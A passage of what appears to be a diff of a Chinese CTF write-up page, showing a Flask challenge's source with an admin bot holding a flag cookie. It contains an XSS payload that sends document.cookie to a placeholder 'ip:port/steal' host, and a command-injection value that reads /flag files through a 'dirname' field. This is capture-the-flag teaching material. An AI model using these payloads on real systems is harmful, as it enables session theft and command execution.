-</span></span><span style="display:flex;"><span>        password <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#39;password&#39;</span>]
-</span></span><span style="display:flex;"><span>        user <span style="color:#f92672">=</span> USERS_DB<span style="color:#f92672">.</span>get(username)
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> user <span style="color:#f92672">and</span> user<span style="color:#f92672">.</span>password <span style="color:#f92672">==</span> password:
-</span></span><span style="display:flex;"><span>            login_user(user)
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> redirect(url_for(<span style="color:#e6db74">&#39;index&#39;</span>))
-</span></span><span style="display:flex;"><span>        flash(<span style="color:#e6db74">&#39;Invalid credentials.&#39;</span>)
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;login.html&#39;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/logout&#39;</span>)
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@login_required</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">logout</span>():
-</span></span><span style="display:flex;"><span>    logout_user()
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> redirect(url_for(<span style="color:#e6db74">&#39;index&#39;</span>))
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/profile&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>, <span style="color:#e6db74">&#39;POST&#39;</span>])
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@login_required</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">profile</span>():
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;POST&#39;</span>:
-</span></span><span style="display:flex;"><span>        current_user<span style="color:#f92672">.</span>bio <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#39;bio&#39;</span>]
-</span></span><span style="display:flex;"><span>        print(current_user<span style="color:#f92672">.</span>bio)
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> redirect(url_for(<span style="color:#e6db74">&#39;index&#39;</span>))
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;profile.html&#39;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/ticket&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>, <span style="color:#e6db74">&#39;POST&#39;</span>])
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">ticket</span>():
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;POST&#39;</span>:
-</span></span><span style="display:flex;"><span>        ticket <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#39;ticket&#39;</span>]
-</span></span><span style="display:flex;"><span>        response <span style="color:#f92672">=</span> make_response(redirect(url_for(<span style="color:#e6db74">&#39;index&#39;</span>)))
-</span></span><span style="display:flex;"><span>        response<span style="color:#f92672">.</span>set_cookie(<span style="color:#e6db74">&#39;ticket&#39;</span>, ticket)
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> response
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;ticket.html&#39;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/view&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;GET&#34;</span>])
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@login_required</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">view_user</span>():
-</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    # I found a bug in it.
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    # Until I fix it, I&#39;ve banned /api/bio/. Have fun :)
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
-</span></span><span style="display:flex;"><span>    username <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;username&#34;</span>,default<span style="color:#f92672">=</span>current_user<span style="color:#f92672">.</span>username)
-</span></span><span style="display:flex;"><span>    visit_url(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;http://localhost/api/bio/</span><span style="color:#e6db74">{</span>username<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-</span></span><span style="display:flex;"><span>    template <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&#34;&#34;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    </span><span style="color:#ae81ff">{{</span><span style="color:#e6db74">\% extends &#34;base.html&#34; \%</span><span style="color:#ae81ff">}}</span><span style="color:#e6db74">
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    </span><span style="color:#ae81ff">{{</span><span style="color:#e6db74">\% block title \%</span><span style="color:#ae81ff">}}</span><span style="color:#e6db74">success</span><span style="color:#ae81ff">{{</span><span style="color:#e6db74">\% endblock \%</span><span style="color:#ae81ff">}}</span><span style="color:#e6db74">
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    </span><span style="color:#ae81ff">{{</span><span style="color:#e6db74">\% block content \%</span><span style="color:#ae81ff">}}</span><span style="color:#e6db74">
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;h1&gt;bot will visit your bio&lt;/h1&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;p style=&#34;margin-top: 1.5rem;&#34;&gt;&lt;a href=&#34;</span><span style="color:#ae81ff">{{</span><span style="color:#e6db74"> url_for(&#39;index&#39;) </span><span style="color:#ae81ff">}}</span><span style="color:#e6db74">&#34;&gt;Back to Home&lt;/a&gt;&lt;/p&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    </span><span style="color:#ae81ff">{{</span><span style="color:#e6db74">\% endblock \%</span><span style="color:#ae81ff">}}</span><span style="color:#e6db74">
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template_string(template)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/api/bio/&lt;string:username&gt;&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;GET&#34;</span>])
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@login_required</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_user_bio</span>(username):
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> current_user<span style="color:#f92672">.</span>username <span style="color:#f92672">==</span> username:
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Unauthorized&#34;</span>, <span style="color:#ae81ff">401</span>
-</span></span><span style="display:flex;"><span>    user <span style="color:#f92672">=</span> USERS_DB<span style="color:#f92672">.</span>get(username)
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> user:
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;User not found.&#34;</span>, <span style="color:#ae81ff">404</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> user<span style="color:#f92672">.</span>bio
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">visit_url</span>(url):
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
-</span></span><span style="display:flex;"><span>        flag_value <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>environ<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;FLAG&#39;</span>, <span style="color:#e6db74">&#39;flag</span><span style="color:#e6db74">{fake}</span><span style="color:#e6db74">&#39;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> sync_playwright() <span style="color:#66d9ef">as</span> p:
-</span></span><span style="display:flex;"><span>            browser <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>chromium<span style="color:#f92672">.</span>launch(headless<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, args<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;--no-sandbox&#34;</span>])
-</span></span><span style="display:flex;"><span>            context <span style="color:#f92672">=</span> browser<span style="color:#f92672">.</span>new_context()
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>            context<span style="color:#f92672">.</span>add_cookies([{
-</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;name&#39;</span>: <span style="color:#e6db74">&#39;flag&#39;</span>,
-</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;value&#39;</span>: flag_value,
-</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;domain&#39;</span>: <span style="color:#e6db74">&#39;localhost&#39;</span>,
-</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;path&#39;</span>: <span style="color:#e6db74">&#39;/&#39;</span>,
-</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;httponly&#39;</span>: <span style="color:#66d9ef">True</span>
-</span></span><span style="display:flex;"><span>            }])
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>            page <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>new_page()
-</span></span><span style="display:flex;"><span>            page<span style="color:#f92672">.</span>goto(<span style="color:#e6db74">&#34;http://localhost/login&#34;</span>, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">5000</span>)
-</span></span><span style="display:flex;"><span>            page<span style="color:#f92672">.</span>fill(<span style="color:#e6db74">&#34;input[name=&#39;username&#39;]&#34;</span>, <span style="color:#e6db74">&#34;admin&#34;</span>)
-</span></span><span style="display:flex;"><span>            page<span style="color:#f92672">.</span>fill(<span style="color:#e6db74">&#34;input[name=&#39;password&#39;]&#34;</span>, admin_password)
-</span></span><span style="display:flex;"><span>            page<span style="color:#f92672">.</span>click(<span style="color:#e6db74">&#34;input[name=&#39;submit&#39;]&#34;</span>)
-</span></span><span style="display:flex;"><span>            page<span style="color:#f92672">.</span>wait_for_timeout(<span style="color:#ae81ff">3000</span>)
-</span></span><span style="display:flex;"><span>            page<span style="color:#f92672">.</span>goto(url, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">5000</span>)
-</span></span><span style="display:flex;"><span>            page<span style="color:#f92672">.</span>wait_for_timeout(<span style="color:#ae81ff">5000</span>)
-</span></span><span style="display:flex;"><span>            browser<span style="color:#f92672">.</span>close()
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
-</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Bot error: </span><span style="color:#e6db74">{</span>str(e)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
-</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>run(host<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;0.0.0.0&#39;</span>, port<span style="color:#f92672">=</span><span style="color:#ae81ff">5000</span>)
-</span></span></code></pre></div><p>实现了一个常规的注册登录修改个人信息的功能，个人信息中可以修改两条内容，一个是ticket，另一个是bio，同时提供了bot访问指定用户bio的功能，第一时间想到XSS带出Cookie，将bio改为XSS语句：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;http://ip:port/steal?flag=&#39;</span><span style="color:#f92672">+</span>document.<span style="color:#a6e22e">cookie</span>)<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
-</span></span></code></pre></div><p>想要实现XSS还需要解决两个问题，第一个问题<code>/api/bio/&lt;string:username&gt;</code>路由要求只能自己访问自己的bio，第二个问题bot设置Cookie的<code>httpOnly</code>属性为True，正常情况下是无法通过javascript脚本来获取Cookie的</p>
-<p>nginx.conf：</p>
-<pre tabindex="0"><code>user  www-data;
+</code></pre><p>dirname可控实现rce：</p><pre tabindex=0><code>dirname=1;cat /flag*.txt &gt; /app/uploads/c048ac00-3ec7-4557-b328-00e50c5ec392/flag.txt
+</code></pre><hr><h2 id=unfinished>Unfinished<a hidden class=anchor aria-hidden=true href=#unfinished>#</a></h2><p>app.py：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> flask <span style=color:#f92672>import</span> Flask, request, render_template, redirect, url_for, flash, render_template_string, make_response
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> flask_login <span style=color:#f92672>import</span> LoginManager, UserMixin, login_user, logout_user, current_user, login_required
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> requests
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> markupsafe <span style=color:#f92672>import</span> escape
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> playwright.sync_api <span style=color:#f92672>import</span> sync_playwright
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> os
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>app <span style=color:#f92672>=</span> Flask(__name__)
+</span></span><span style=display:flex><span>app<span style=color:#f92672>.</span>config[<span style=color:#e6db74>&#39;SECRET_KEY&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;your-secret-key-here&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>login_manager <span style=color:#f92672>=</span> LoginManager()
+</span></span><span style=display:flex><span>login_manager<span style=color:#f92672>.</span>init_app(app)
+</span></span><span style=display:flex><span>login_manager<span style=color:#f92672>.</span>login_view <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;login&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>User</span>(UserMixin):
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>__init__</span>(self, id, username, password, bio<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;&#34;</span>):
+</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>id <span style=color:#f92672>=</span> id
+</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>username <span style=color:#f92672>=</span> username
+</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>password <span style=color:#f92672>=</span> password
+</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>bio <span style=color:#f92672>=</span> bio
+</span></span><span style=display:flex><span>admin_password <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>urandom(<span style=color:#ae81ff>12</span>)<span style=color:#f92672>.</span>hex()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>USERS_DB <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#39;admin&#39;</span>: User(id<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>, username<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;admin&#39;</span>, password<span style=color:#f92672>=</span>admin_password)}
+</span></span><span style=display:flex><span>USER_ID_COUNTER <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>@login_manager.user_loader</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>load_user</span>(user_id):
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> user <span style=color:#f92672>in</span> USERS_DB<span style=color:#f92672>.</span>values():
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> str(user<span style=color:#f92672>.</span>id) <span style=color:#f92672>==</span> user_id:
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> user
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>None</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/&#39;</span>)
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>index</span>():
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;index.html&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/register&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;GET&#39;</span>, <span style=color:#e6db74>&#39;POST&#39;</span>])
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>register</span>():
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>global</span> USER_ID_COUNTER
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> request<span style=color:#f92672>.</span>method <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;POST&#39;</span>:
+</span></span><span style=display:flex><span>        username <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form[<span style=color:#e6db74>&#39;username&#39;</span>]
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> username <span style=color:#f92672>in</span> USERS_DB:
+</span></span><span style=display:flex><span>            flash(<span style=color:#e6db74>&#39;Username already exists.&#39;</span>)
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> redirect(url_for(<span style=color:#e6db74>&#39;register&#39;</span>))
+</span></span><span style=display:flex><span>        
+</span></span><span style=display:flex><span>        USER_ID_COUNTER <span style=color:#f92672>+=</span> <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>        new_user <span style=color:#f92672>=</span> User(
+</span></span><span style=display:flex><span>            id<span style=color:#f92672>=</span>USER_ID_COUNTER,
+</span></span><span style=display:flex><span>            username<span style=color:#f92672>=</span>username,
+</span></span><span style=display:flex><span>            password<span style=color:#f92672>=</span>request<span style=color:#f92672>.</span>form[<span style=color:#e6db74>&#39;password&#39;</span>]
+</span></span><span style=display:flex><span>        )
+</span></span><span style=display:flex><span>        USERS_DB[username] <span style=color:#f92672>=</span> new_user
+</span></span><span style=display:flex><span>        login_user(new_user)
+</span></span><span style=display:flex><span>        response <span style=color:#f92672>=</span> make_response(redirect(url_for(<span style=color:#e6db74>&#39;index&#39;</span>)))
+</span></span><span style=display:flex><span>        response<span style=color:#f92672>.</span>set_cookie(<span style=color:#e6db74>&#39;ticket&#39;</span>, <span style=color:#e6db74>&#39;your_ticket_value&#39;</span>)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> response
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;register.html&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/login&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;GET&#39;</span>, <span style=color:#e6db74>&#39;POST&#39;</span>])
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>login</span>():
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> request<span style=color:#f92672>.</span>method <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;POST&#39;</span>:
+</span></span><span style=display:flex><span>        username <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form[<span style=color:#e6db74>&#39;username&#39;</span>]
+</span></span><span style=display:flex><span>        password <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form[<span style=color:#e6db74>&#39;password&#39;</span>]
+</span></span><span style=display:flex><span>        user <span style=color:#f92672>=</span> USERS_DB<span style=color:#f92672>.</span>get(username)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> user <span style=color:#f92672>and</span> user<span style=color:#f92672>.</span>password <span style=color:#f92672>==</span> password:
+</span></span><span style=display:flex><span>            login_user(user)
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> redirect(url_for(<span style=color:#e6db74>&#39;index&#39;</span>))
+</span></span><span style=display:flex><span>        flash(<span style=color:#e6db74>&#39;Invalid credentials.&#39;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;login.html&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/logout&#39;</span>)
+</span></span><span style=display:flex><span><span style=color:#a6e22e>@login_required</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>logout</span>():
+</span></span><span style=display:flex><span>    logout_user()
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> redirect(url_for(<span style=color:#e6db74>&#39;index&#39;</span>))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/profile&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;GET&#39;</span>, <span style=color:#e6db74>&#39;POST&#39;</span>])
+</span></span><span style=display:flex><span><span style=color:#a6e22e>@login_required</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>profile</span>():
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> request<span style=color:#f92672>.</span>method <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;POST&#39;</span>:
+</span></span><span style=display:flex><span>        current_user<span style=color:#f92672>.</span>bio <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form[<span style=color:#e6db74>&#39;bio&#39;</span>]
+</span></span><span style=display:flex><span>        print(current_user<span style=color:#f92672>.</span>bio)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> redirect(url_for(<span style=color:#e6db74>&#39;index&#39;</span>))
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;profile.html&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/ticket&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;GET&#39;</span>, <span style=color:#e6db74>&#39;POST&#39;</span>])
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>ticket</span>():
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> request<span style=color:#f92672>.</span>method <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;POST&#39;</span>:
+</span></span><span style=display:flex><span>        ticket <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form[<span style=color:#e6db74>&#39;ticket&#39;</span>]
+</span></span><span style=display:flex><span>        response <span style=color:#f92672>=</span> make_response(redirect(url_for(<span style=color:#e6db74>&#39;index&#39;</span>)))
+</span></span><span style=display:flex><span>        response<span style=color:#f92672>.</span>set_cookie(<span style=color:#e6db74>&#39;ticket&#39;</span>, ticket)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> response
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;ticket.html&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#34;/view&#34;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#34;GET&#34;</span>])
+</span></span><span style=display:flex><span><span style=color:#a6e22e>@login_required</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>view_user</span>():
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    # I found a bug in it.
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    # Until I fix it, I&#39;ve banned /api/bio/. Have fun :)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>    username <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>args<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;username&#34;</span>,default<span style=color:#f92672>=</span>current_user<span style=color:#f92672>.</span>username)
+</span></span><span style=display:flex><span>    visit_url(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;http://localhost/api/bio/</span><span style=color:#e6db74>{</span>username<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
+</span></span><span style=display:flex><span>    template <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;&#34;&#34;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    </span><span style=color:#ae81ff>{{</span><span style=color:#e6db74>\% extends &#34;base.html&#34; \%</span><span style=color:#ae81ff>}}</span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    </span><span style=color:#ae81ff>{{</span><span style=color:#e6db74>\% block title \%</span><span style=color:#ae81ff>}}</span><span style=color:#e6db74>success</span><span style=color:#ae81ff>{{</span><span style=color:#e6db74>\% endblock \%</span><span style=color:#ae81ff>}}</span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    </span><span style=color:#ae81ff>{{</span><span style=color:#e6db74>\% block content \%</span><span style=color:#ae81ff>}}</span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &lt;h1&gt;bot will visit your bio&lt;/h1&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &lt;p style=&#34;margin-top: 1.5rem;&#34;&gt;&lt;a href=&#34;</span><span style=color:#ae81ff>{{</span><span style=color:#e6db74> url_for(&#39;index&#39;) </span><span style=color:#ae81ff>}}</span><span style=color:#e6db74>&#34;&gt;Back to Home&lt;/a&gt;&lt;/p&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    </span><span style=color:#ae81ff>{{</span><span style=color:#e6db74>\% endblock \%</span><span style=color:#ae81ff>}}</span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> render_template_string(template)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#34;/api/bio/&lt;string:username&gt;&#34;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#34;GET&#34;</span>])
+</span></span><span style=display:flex><span><span style=color:#a6e22e>@login_required</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_user_bio</span>(username):
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> current_user<span style=color:#f92672>.</span>username <span style=color:#f92672>==</span> username:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;Unauthorized&#34;</span>, <span style=color:#ae81ff>401</span>
+</span></span><span style=display:flex><span>    user <span style=color:#f92672>=</span> USERS_DB<span style=color:#f92672>.</span>get(username)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> user:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;User not found.&#34;</span>, <span style=color:#ae81ff>404</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> user<span style=color:#f92672>.</span>bio
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>visit_url</span>(url):
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
